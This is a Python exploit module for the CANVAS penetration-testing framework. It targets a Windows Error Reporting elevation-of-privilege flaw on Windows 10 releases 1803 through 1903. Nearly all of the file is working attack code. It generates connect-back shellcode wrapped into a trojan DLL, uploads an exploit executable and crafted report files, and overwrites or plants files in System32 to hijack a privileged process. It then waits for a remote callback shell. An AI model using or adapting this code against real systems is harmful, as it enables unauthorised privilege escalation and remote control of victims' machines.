#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  error_reporting.py
## Description:  An elevation of privilege vulnerability exist on Windows Error
##               Reporting Manager
## Created_On :  Fri Nov 7 2019
## Created_By :  Nox
##
## (c) Copyright 2019, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import time
import struct
import random
import logging

if "." not in sys.path:
    sys.path.append(".")

import canvasengine
from canvaserror import NodeCommandError
from exploitutils import *
from libs.canvasos import canvasos
from libs.node_utils import update_graph_node
from shellcode.standalone.windows.payloads import payloads
from shellcode.standalone.windows.payloads64 import payloads as payloads64
from MOSDEF.pelib import PElib
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit

from WindowsConstants import KEY_QUERY_VALUE
from WindowsConstants import HKEY_LOCAL_MACHINE
from WindowsConstants import GENERIC_WRITE


targets={
    0: ['Autodetect',[0,0,0,0]]
}


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.node                   = None

        self.name                   = NAME
        self.local_path             = os.path.dirname(__file__)
        self.binaries_path          = os.path.join(self.local_path, "Resources")

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def make_dll(self):
        t_os = canvasos('WINDOWS')
        t_os.arch = "x64" if (self.is_64bit_node() or self.has_wow64()) else "x86"

        if t_os.arch == "x64":
            plds = payloads64(dll=True)

            inner_pld = payloads64(module=self, dll=False)
            assembly_inner = inner_pld.callback(self.callback.ip, self.callback.port, universal=True)
            code_inner = inner_pld.assemble(assembly_inner)

            assembly_outer = plds.wrap_payload(code_inner)
            shellcode = plds.assemble(assembly_outer)

            myPElib = PElib(win64=1)
            trojan_dll = myPElib.createPEFileBuf({'DllMain' : shellcode}, gui=False)
        else:
            plds = payloads(module=self, dll=True)
            assembly_inner = plds.callback(self.callback.ip, self.callback.port, universal=True)
            shellcode = plds.assemble(assembly_inner)

            myPElib = PElib()
            importante = myPElib.get_random_imports()
            trojan_dll = myPElib.createPEFileBuf({'DllMain' : shellcode}, gui=False, importante=importante)

        return trojan_dll


    def make_dll_last_win(self):
        t_os = canvasos('WINDOWS')
        t_os.arch = "x64" if (self.is_64bit_node() or self.has_wow64()) else "x86"

        dll_name = ""

        if t_os.arch == "x64":
            dll_name = "dll_x64.dll"
            plds = payloads64(module=self, dll=False) # False-> terminate thread // True -> ret
        else:
            dll_name = "dll_x86.dll"
            plds = payloads(module=self, dll=False)

        assembly_inner = plds.callback(self.callback.ip, self.callback.port, universal=True)
        code_inner = plds.assemble(assembly_inner)
        code_len = len(code_inner)

        local_dll_path = os.path.join(self.binaries_path, dll_name)

        with open(local_dll_path, 'rb') as f:
            local_dll_binary = f.read()

        pos = local_dll_binary.find("NOX")
        tmp_dll_binary = local_dll_binary[:pos]
        tmp_dll_binary += code_inner
        tmp_dll_binary += local_dll_binary[pos+len(code_inner):]


        tmp_dll_name = "%s.dll" % random.randint(10001, 99999)
        tmp_dll_path = os.path.join(self.binaries_path, tmp_dll_name)
        logging.info(tmp_dll_path)
        with open(tmp_dll_path, 'wb') as f:
            f.write(tmp_dll_binary)

        windir = self.node.shell.GetEnvironmentVariable('SystemRoot')
        if self.has_wow64():
            remote_dll_path = windir + "\\Sysnative\\windowscoredeviceinfo.dll"
        else:
            remote_dll_path = windir + "\\System32\\windowscoredeviceinfo.dll"


        if not self.nodeUpload(tmp_dll_path, remote_dll_path):
            os.unlink(tmp_dll_path)
            return False

        os.unlink(tmp_dll_path)

        return True


    def write_dll(self):
        windir_path = self.node.shell.GetEnvironmentVariable('SystemRoot')

        if not windir_path:
            logging.error("Could not resolve full WINDIR directory path")
            return False

        dll_name = "%s.dll" % random.randint(10001, 99999)
        local_dll_path = os.path.join(self.binaries_path, dll_name)

        with open(local_dll_path, 'wb') as f:
            f.write(self.make_dll())

        if self.has_wow64():
            remote_target_path = windir_path + '\\Sysnative\\license.rtf'
        else:
            remote_target_path = windir_path + '\\System32\\license.rtf'

        if not self.nodeUpload(local_dll_path, remote_target_path):
            os.unlink(local_dll_path)
            logging.debug("Failed to upload the DLL (license.rtf)")
            return False

        os.unlink(local_dll_path)

        return True

    def write_exe(self):
        t_os = canvasos('WINDOWS')
        t_os.arch = "x64" if (self.is_64bit_node() or self.has_wow64()) else "x86"

        xpl_orig_name = "exploit.exe"

        local_exploit_path = os.path.join(self.binaries_path, xpl_orig_name)

        tmp_path = self.node.shell.GetTempPathA()
        if not tmp_path:
            logging.error("Could not resolve full temp directory path")
            return False
        else:
            logging.info("Temp directory: %s" % tmp_path)

        if self.node.shell.chdir(tmp_path) < 0:
            logging.error("Could not chdir into %s" % tmp_path)
            return False

        remote_exploit_name = "%s.exe" % random.randint(10001, 99999)
        remote_exploit_path = tmp_path + remote_exploit_name

        logging.info(local_exploit_path)
        logging.info(remote_exploit_path)

        if not self.nodeUpload(local_exploit_path, remote_exploit_path):
            logging.error("Failed to upload the EXE")
            return False

        return remote_exploit_path

    def put_files(self):
        files_path = []

        dummy_file_name = "dd_vcredist_x86_1010206121819.log"
        local_dummy_file_path = os.path.join(self.binaries_path, dummy_file_name)

        tmp_path = self.node.shell.GetTempPathA()
        remote_dummy_file_path = tmp_path + dummy_file_name
        if not self.nodeUpload(local_dummy_file_path, remote_dummy_file_path):
            logging.error("Failed to upload the dummy file %s" % dummy_file_name)

        report_file_name = "Report.wer"
        local_report_file_path = os.path.join(self.binaries_path, report_file_name)
        remote_report_file_path = tmp_path + report_file_name
        if not self.nodeUpload(local_report_file_path, remote_report_file_path):
            logging.error("Failed to upload the Report.wer file")
            return False
        files_path.append(remote_report_file_path)

        report_tmp_file_name = "Report.wer.tmp"
        remote_report_tmp_file_path = tmp_path + report_tmp_file_name
        if not self.nodeUpload(local_report_file_path, remote_report_tmp_file_path):
            logging.error("Failed to upload the Report.wer.tmp file")
            return False
        files_path.append(remote_report_tmp_file_path)

        return files_path

    def detect_releaseid(self):
        RELEASEID_KEY = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        hKey = self.node.shell.get_reg_key_handle(HKEY_LOCAL_MACHINE, RELEASEID_KEY, KEY_QUERY_VALUE)

        releaseid = int(self.node.shell.RegQueryValueEx(hKey, "ReleaseID")[2].strip('\0'))

        return releaseid

    def spawn_process(self, path):
        logging.info("Spawning exploit: %s" % path)

        try:
            cmd_line = path
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 0,
                                                 dwCreationFlags = 0x08000000)
        except Exception, ex:
            logging.error("%s" % ex)
            return False

        return ret


    def run(self):
        ret = 0
        for node in self.argsDict["passednodes"]:
            self.node = node

            if not self.is_windows_node():
                continue

            if not any([self.is_win10_node(),
                        self.is_win2016_node()]):
                logging.warning("Not Windows 10/2016")
                continue

            releaseid = self.detect_releaseid()
            logging.info("Windows 10 %d" % releaseid)

            win10 = [1803, 1809, 1903]
            if not int(releaseid) in win10:
                logging.warning("Windows 10 Release ID not supported")
                return False

            windir_path = self.node.shell.GetEnvironmentVariable('SystemRoot')
            if not windir_path:
                logging.error("Could not resolve full WINDIR directory path")
                return False
            else:
                logging.info("WINDIR directory: %s" % windir_path)

            remote_files = self.put_files()

            if not remote_files:
                logging.error("Error writing mandatary files")
                return False

            for remote_file in remote_files:
                self.add_file_for_cleanup(remote_file)

            is_license = True
            if releaseid != 1903:
                if self.has_wow64():
                    remote_license_path = windir_path + '\\Sysnative\\license.rtf'
                else:
                    remote_license_path = windir_path + '\\System32\\license.rtf'


                tmp_license_name = "%s.rtf" % random.randint(10001, 99999)
                local_license_path = os.path.join(self.binaries_path, tmp_license_name)
                try:
                    self.node.shell.download(remote_license_path, local_license_path)
                except NodeCommandError as e:
                    is_license = False
                    logging.error('Failed to download %s file' % remote_license_path)

            remote_exploit_path = self.write_exe()

            if not self.spawn_process(remote_exploit_path):
                logging.error("Could not spawn %s" % NAME)
                logging.error("The exploit failed")
                return False

            time.sleep(40)


            isSucess = False
            if (releaseid == 1903):
                logging.info("Writing the DLL for the privilege elevation method")
                logging.info("Waiting for 1 second")
                for i in range(20):
                    if self.make_dll_last_win():
                        isSucess = True
                        break
                    time.sleep(1)

                if not isSucess:
                    logging.warning("Error writing windowscoredeviceinfo.dll")
                    logging.error("The exploit failed")
                    return False

            elif (releaseid == 1803 or releaseid == 1809):
                logging.info("Writing the file license.rtf")
                logging.info("Waiting for 1 second")
                for i in range(0, 20):
                    if self.write_dll():
                        isSucess = True
                        break
                    time.sleep(5)
                    logging.info("Waiting for %d seconds" % (i + 5))


            self.add_file_for_cleanup(remote_exploit_path)
            time.sleep(5)
            if not isSucess:
                if releaseid != 1903 and is_license:
                    logging.info("Could not write the file license.rtf")
                    os.unlink(local_license_path)
                logging.info("The exploit failed")
                return False

            cmd = remote_exploit_path + ' ' + 'LoadDLL'
            if not self.spawn_process(cmd):
                logging.error("Could not spawn %s" % NAME)
            time.sleep(5)

            if releaseid != 1903:
                if is_license:
                    if not self.nodeUpload(local_license_path, remote_license_path):
                        logging.error("Failed to upload the license.rtf")
                    os.unlink(local_license_path)

            logging.info("Waiting for the callback connection ...")
            logging.info("Waiting for 1 second")
            for i in range(30):
                if self.ISucceeded():
                    ret = 1
                    self.summary[node] = 1
                    break
                time.sleep(1)
                logging.info("Waiting for %d seconds" % i)

        return ret


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPION, VERSION))
    app = theexploit()
    ret = standar_callback_commandline(app)
